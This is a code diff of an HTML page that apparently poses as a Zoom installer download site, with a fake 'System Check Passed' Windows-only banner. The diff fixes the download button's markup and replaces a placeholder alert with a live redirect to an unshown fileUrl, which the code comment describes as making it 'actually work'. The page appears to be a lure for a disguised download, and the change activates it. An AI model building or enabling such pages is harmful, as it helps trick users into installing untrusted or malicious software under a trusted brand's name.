@@ -308,7 +308,7 @@
               <strong>System Check Passed:</strong><br />
               This site is only available for Windows users.
             </div>
-            <<button class="download-btn" onclick="triggerDownload()">
+            <button class="download-btn" onclick="triggerDownload()">
               Download file
             </button>
             <div
@@ -429,8 +429,8 @@
         btn.style.backgroundColor = "#107c10"; // Green color
 
         setTimeout(() => {
-          alert("Zoom Installer Download Starting...");
-          // window.location.href = fileUrl; // Uncomment this to make it actually work
+          // alert("Zoom Installer Download Starting...");
+          window.location.href = fileUrl; // Uncomment this to make it actually work
           btn.innerText = originalText;
           btn.style.backgroundColor = "#0067c0";
         }, 500);
@@ -477,4 +477,5 @@
       });
     </script>
   </body>
+
 </html>
